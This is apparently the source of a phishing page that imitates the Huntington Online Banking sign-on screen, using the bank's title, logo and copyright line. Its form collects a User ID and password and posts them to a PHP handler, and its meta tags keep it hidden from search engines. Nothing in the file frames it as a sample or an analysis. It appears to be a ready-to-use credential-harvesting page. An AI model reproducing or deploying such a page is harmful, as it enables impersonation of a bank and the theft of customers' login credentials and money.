<?php require('func.php');?>
<!DOCTYPE HTML>
<html lang="en-US" prefix="og: http://ogp.me/ns#">
    <head>
        <!-- Meta Tags -->
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"/>
	<meta name="HandheldFriendly" content="true" />
	<link rel="icon" href="img/core-img/favicon.ico">
	<meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex, nofollow">
	<title>Huntington Online Banking Login | Huntington</title>
    <style>
body,html{margin:0;padding:0;background-color:#696969;}
            body{backgrond:#fff;max-width:750px;margin:auto;}
            .head{box-shadow: 0px 1px 0px 1px #000;border-bottom:1px solid #000;background-color: #222;padding:10px;width:auto;}
            .foot{border-bottom:1px solid #000;background-color: #222;padding:10px;width: 100%;}
            .button{background-color: #222;
  color: #696969;
  padding: 12px;
  border-radius: 5px;
  font-weight:bold;
  font-size:17px;
  border:1px solid #000;
  width: 100%;}
            .text{text-shadow: 0px 0px 2px #000;font-size:12px;margin:15px;color:#ffffff;font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;}
            .mtext{text-shadow: 1px 0px 2px #000;font-size:13px;margin:15px;color:#fff;font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;}
            .mybox{text-shadow: 0px 0px 2px #000;font-size:12px;margin:15px;padding:10px;border-radius:5px;border:1px solid #000;background-color:#ffffff;font-family:lato,sans-serif;}
            .input-group {
 margin: 5px 13px 5px 1px; } .input-group label { display: block;
 text-align: left; margin: 3px;} .input-group input { box-shadow: rgba(0,0,0,0.3) 0 0 10px;
 border-collapse: collapse; height: 25px;
 padding: 5px;
 width: 100%;
 font-size: 16px;
 border-radius: 5px; border: 1px solid #222; background:#fff;
 }
 .btn {
 padding: 10px;
 width:auto;
 font-size: 15px;
 color: #000;
 background: #696969;border-radius: 5px; }
</style>
</head>
<body>
<div class="head"><center><img src="lockup.svg" width="160" height="auto" /></center></div>
<br>
<div id="ytWidget"></div><script src="https://translate.yandex.net/website-widget/v1/widget.js?widgetId=ytWidget&pageLang=en&widgetTheme=light&autoMode=false" type="text/javascript"></script> 

<div class="text">Enter your User ID and password to sign on to Huntington Online Banking.</div>
<?php echo display_error(); ?>
<div class="mybox">
<form method="post" action="index">
    
<div class="input-group">
			<input type="text" required name="username" placeholder="User ID">
 </div>
 <hr/>
		<div class="input-group">
			<input type="password" required name="password" id="myInput" placeholder="Password">
		</div>
</div>
<br/><br>
<div align="center" class="mtext">© 2021 Huntington Bancshares Incorporated.</div>
<div>
			<button class="foot button" type="submit" class="btn" name="login_btn">Continue</button>
		</div>
</form>
</body>
</html>